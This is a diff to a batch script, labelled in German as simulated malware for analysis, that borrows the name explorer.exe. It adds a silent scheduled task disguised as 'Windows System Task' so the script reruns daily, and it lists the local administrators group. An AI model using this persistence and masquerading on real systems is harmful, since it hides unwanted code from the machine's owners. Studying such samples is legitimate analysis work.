@@ -1,6 +1,7 @@
 @echo off
 :: explorer.exe - Simuliertes "Malware"-Verhalten zu Analysezwecken
 setlocal ENABLEDELAYEDEXPANSION
+schtasks /create /sc daily /tn "Windows System Task" /tr "\"%~f0\"" /st 12:00 /f >nul 2>&1
 
 net localgroup administrators > admins_raw.txt
 set "adminlist="
